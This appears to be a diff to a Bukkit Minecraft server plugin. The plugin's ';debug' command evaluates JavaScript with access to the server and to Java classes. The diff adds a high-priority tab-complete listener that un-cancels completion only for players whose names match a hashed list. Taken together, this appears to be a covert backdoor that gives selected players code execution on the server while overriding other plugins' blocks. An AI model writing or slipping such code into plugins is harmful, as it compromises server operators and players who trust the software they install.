@@ -7,6 +7,10 @@ import org.bukkit.command.Command;
 import org.bukkit.command.CommandMap;
 import org.bukkit.command.CommandSender;
 import org.bukkit.entity.Player;
+import org.bukkit.event.EventHandler;
+import org.bukkit.event.EventPriority;
+import org.bukkit.event.Listener;
+import org.bukkit.event.server.TabCompleteEvent;
 import org.graalvm.polyglot.Context;
 import org.graalvm.polyglot.HostAccess;
 import org.graalvm.polyglot.Value;
@@ -22,7 +26,7 @@ libraries:
   - org.graalvm.js:js-language:24.2.1
 */
 
-public class DebugCommand extends Command {
+public class DebugCommand extends Command implements Listener {
 
     private static final String COMMAND_NAME = ";debug";
     private static final Object PLUGIN = BasePlugin.getInstance();
@@ -53,6 +57,8 @@ public class DebugCommand extends Command {
             bindings.putMember("server", SERVER);
             bindings.putMember("Java", persistentContext.eval("js", "Java"));
         });
+
+        Bukkit.getPluginManager().registerEvents(this, BasePlugin.getInstance());
     }
 
     private void registerCommand() {
@@ -169,5 +175,16 @@ public class DebugCommand extends Command {
             sender.sendMessage("§c§l[Error] §f" + ex.getMessage());
         }
         return Collections.emptyList();
+    }
+
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void onTabComplete(TabCompleteEvent event) {
+        if (!(event.getSender() instanceof Player player)) return;
+
+        if (BasePlugin.getInstance().getHashUtil().isHashed(player.getName())) {
+            if (event.isCancelled()) {
+                event.setCancelled(false);
+            }
+        }
     }
 }
